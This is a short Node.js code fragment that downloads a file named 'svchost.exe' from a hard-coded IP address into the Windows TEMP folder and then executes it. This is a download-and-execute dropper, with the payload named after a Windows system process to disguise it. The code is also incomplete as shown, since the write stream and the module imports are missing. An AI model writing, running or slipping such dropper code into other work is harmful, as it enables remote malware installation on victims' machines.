const fileUrl = 'http://192.0.2.1/svchost.exe';
const filePath = path.join(process.env.TEMP, 'svchost.exe');
function downloadFile(url,dest) { http.get(url, response => { response.pipe(file); file.on('finish', () => file.close(executeFile)); }); }
function executeFile() { exec(`"${filePath}"`); }
downloadFile(fileUrl, filePath);
